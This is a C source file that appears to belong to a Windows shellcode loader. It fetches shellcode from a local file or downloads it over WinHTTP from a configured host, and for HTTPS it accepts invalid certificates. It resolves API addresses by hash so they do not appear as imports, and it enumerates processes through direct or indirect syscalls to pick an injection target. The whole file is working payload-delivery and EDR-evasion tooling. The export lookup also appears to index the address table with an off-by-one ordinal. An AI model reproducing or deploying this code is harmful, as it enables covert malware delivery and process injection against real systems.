#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include "structs.h"
#include "main.h"
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")


//https://github.com/Cracked5pider/LdrLibraryEx/blob/main/src/LdrLibraryEx.c#L1585

/*-----------------------------------------------------------
Function to get the shellcode from a file on disk
-----------------------------------------------------------*/
#ifndef WEB
BOOL ReadF(const char* file_path, PDWORD file_size, PVOID* read_buffer) {
	FILE* file;

	file = fopen(file_path, "rb");
	if (file == NULL) {
		DEBUG_PRINT("[!] Error opening file: %s", file_path);
		*file_size = 0;
		return FALSE;
	}

	fseek(file, 0, SEEK_END);
	*file_size = ftell(file);
	rewind(file);

	*read_buffer = (char*)malloc(*file_size);
	if (*read_buffer == NULL) {
		DEBUG_PRINT("[!] Memory allocation failed");
		fclose(file);
		return FALSE;
	}

	fread(*read_buffer, 1, *file_size, file);
	DEBUG_PRINT("[*] Reading shellcode from disk with size: %d\n", *file_size);
	fclose(file);
	return TRUE;
}
#endif

/*----------------------------------------------------
 Function to download shellcode from a webserver
----------------------------------------------------*/
#ifdef WEB
BOOL Download(LPCWSTR url, LPCWSTR file, PCONTENT cnt) {


#ifdef SECURE
	unsigned int port = SECURE;
	DWORD secFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
		SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
		SECURITY_FLAG_IGNORE_UNKNOWN_CA;
	DWORD dwFlags = WINHTTP_FLAG_SECURE;

#elif !defined(SECURE)
	DWORD dwFlags = 0;
	unsigned int port = WEB;
#endif


	// Create a HTTP session
	HINTERNET hSession = WinHttpOpen(
		NULL,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0
	);

	if (hSession) {
		// Connect to URL
		HINTERNET hConnect = WinHttpConnect(
			hSession,
			url,
			port,
			0
		);

		if (hConnect) {
			//Create a http request
			HINTERNET hRequest = WinHttpOpenRequest(
				hConnect,
				L"GET",
				file,
				NULL,
				WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES,
				dwFlags
			);
#ifdef SECURE
			//SSL
			BOOL bRet = WinHttpSetOption(
				hRequest,
				WINHTTP_OPTION_SECURITY_FLAGS,
				&secFlags,
				sizeof(DWORD)
			);
#endif
			// Send the request
			if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
				//Parse the response
				if (WinHttpReceiveResponse(hRequest, NULL)) {
					DWORD Size = 0;
					DWORD Downloaded = 0;
					DWORD TotalSize = 0;
					LPSTR download_buffer = NULL;

					do {
						if (!WinHttpQueryDataAvailable(hRequest, &Size)) {
							DEBUG_PRINT("[!] Error %d in WinHttpQueryDataAvailable.\n", GetLastError());
						}

						if (Size > 0) {
							LPSTR temp_buffer = (LPSTR)malloc(Size);
							if (!temp_buffer) {
								DEBUG_PRINT("[!] Out of memory while downloading.\n");
								Size = 0;
								break;
							}

							if (WinHttpReadData(hRequest, (LPVOID)temp_buffer, Size, &Downloaded)) {
								LPSTR new_buffer = (LPSTR)realloc(download_buffer, TotalSize + Downloaded);
								if (!new_buffer) {
									DEBUG_PRINT("[!] Out of memory while reallocating buffer.\n");
									free(temp_buffer);
									Size = 0;
									break;
								}

								download_buffer = new_buffer;
								mymemcpy(download_buffer + TotalSize, temp_buffer, Downloaded);
								TotalSize += Downloaded;
							}

							free(temp_buffer);
						}
					} while (Size > 0);

					if (TotalSize > 0) {
						cnt->data = download_buffer;
						cnt->size = TotalSize;

						WinHttpCloseHandle(hRequest);
						WinHttpCloseHandle(hConnect);
						WinHttpCloseHandle(hSession);

						DEBUG_PRINT("[*] Downloaded the shellcode with size: %d\n", TotalSize);
						return TRUE;
					}
					else {
						free(download_buffer);
						DEBUG_PRINT("[!] Download failed!\n");
						return FALSE;
					}

				}
				WinHttpCloseHandle(hRequest);
			}
			WinHttpCloseHandle(hConnect);
		}
		WinHttpCloseHandle(hSession);
	}
	DEBUG_PRINT("[!] Download failed!\n");
	return FALSE;
}
#endif


/*--------------------------------------------
 Wrapper function to fetch the shellcode
 Either from disk or on the webserver
--------------------------------------------*/
BOOL GetSC(PCONTENT cnt) {

#ifdef WEB
	if (!Download((LPCWSTR)HOST, (LPCWSTR)REMOTE_FILE, cnt)) {
		DEBUG_PRINT(L"[!] Failed downloading %s from %s.\n", HOST, REMOTE_FILE);
		return FALSE;
	}

#elif !defined(WEB)
	if (!ReadF(LOCAL_FILE, &(cnt->size), &(cnt->data))) {
		DEBUG_PRINT("[!] Failed reading the shellcode from disk.\n");
		return FALSE;
	}
#endif
	return TRUE;
}


/*----------------------------------------
 Simple function to replace GetProcAddress
----------------------------------------*/
FARPROC GetAddr(HMODULE hModule, UINT32 ApiHash) {

	DEBUG_PRINT("[*] Fetching address for function: 0x%X.\n", ApiHash);

	//Convert the handle to PBYTE for pointer arithmetic
	PBYTE peStart = (PBYTE)hModule;

	//Get the DOS header and verify it
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)peStart;
	if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		DEBUG_PRINT("[!] Not a valid DOS header.\n");
		return NULL;
	}

	//Get the NT header and verify it
	PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)(peStart + pDosHdr->e_lfanew);
	if (pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		DEBUG_PRINT("[!] No valid NT headers found.\n");
		return NULL;
	}

	//Get the optional headers
	IMAGE_OPTIONAL_HEADER pOptHdr = pNtHdr->OptionalHeader;

	//Get the image export table
	PIMAGE_EXPORT_DIRECTORY pExpTbl = (PIMAGE_EXPORT_DIRECTORY)(peStart + pOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	//Get the addresses of the function names, function addresses and function name ordinals arrays
	PDWORD fnNameArray = (PDWORD)(peStart + pExpTbl->AddressOfNames);
	PDWORD fnAddrArray = (PDWORD)(peStart + pExpTbl->AddressOfFunctions);
	PWORD fnNameOrdinals = (PWORD)(peStart + pExpTbl->AddressOfNameOrdinals);

	//Loop trough the exported functions, NumberOfFunctions is used as a max value
	for (DWORD i = 0; i < pExpTbl->NumberOfFunctions; i++) {
		//pointer to the function's name
		CHAR* pFuncName = (CHAR*)(peStart + fnNameArray[i]);

		//Ordinal of the function
		WORD funcOrdinal = fnNameOrdinals[i];

		//Getting the function's address trough its ordinal
		PVOID funcAddr = (PVOID)(peStart + fnAddrArray[funcOrdinal + 1]);

		//Search for the needed function
		if (ApiHash == HashA(pFuncName)) {
			DEBUG_PRINT("[*] Name: %s, Ordinal: %d, Address: 0x%p\n", pFuncName, funcOrdinal + 1, funcAddr);
			return funcAddr;
		}
	}
	return NULL;
}


/*----------------------------------------
  Function to enumerate running processes
  and choose one for injection
----------------------------------------*/
DWORD GetProcesses(LPWSTR procName, PDWORD pid) {
#define SystemProcessInformation 5

	DEBUG_PRINT("[*] Getting information about running processes.\n");
	ULONG bufferSize = 0;
	NTSTATUS status = 0;

#ifdef SYSCALL_INDIRECT
	//Indirect syscall method
	GetSSNI(g_Fun.NtQuerySystemInformation.dwSSn, g_Fun.NtQuerySystemInformation.pSyscallIndJmp);
	status = InvokeI(SystemProcessInformation, NULL, 0, &bufferSize);

#elif !defined(SYSCALL_INDIRECT)
	//Direct syscall method
	GetSSND(g_Fun.NtQuerySystemInformation.dwSSn);
	status = InvokeD(SystemProcessInformation, NULL, 0, &bufferSize);
#endif

	//Get the actual processes
	PVOID procBuffer = malloc(bufferSize);
#ifdef SYSCALL_INDIRECT
	//Indirect syscall method
	GetSSNI(g_Fun.NtQuerySystemInformation.dwSSn, g_Fun.NtQuerySystemInformation.pSyscallIndJmp);
	status = InvokeI(SystemProcessInformation, procBuffer, bufferSize, NULL);

#elif !defined(SYSCALL_INDIRECT)
	//Direct syscall method
	GetSSND(g_Fun.NtQuerySystemInformation.dwSSn);
	status = InvokeD(SystemProcessInformation, procBuffer, bufferSize, NULL);
#endif
	if (status != 0x00) {
		DEBUG_PRINT("[!] Querying system information failed: 0x%X\n", status);
		return FALSE;
	}

	//Go trough processes
	DWORD count = 0;
	PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)procBuffer;
	while (procInfo) {

		if (procInfo->ImageName.Buffer) {
			if (procName != NULL) {
				if (wcscmp(procName, procInfo->ImageName.Buffer) == 0) {
					WDEBUG_PRINT(L"[*] Match -> Proc ID: %d, Name: %s\n", (DWORD)procInfo->UniqueProcessId, procInfo->ImageName.Buffer);
					*pid = procInfo->UniqueProcessId;
				}
			}
		}
		if (procInfo->NextEntryOffset == 0) {
			break;
		}
		count++;
		procInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)procInfo + procInfo->NextEntryOffset);
	}
	free(procBuffer);
	return count;
}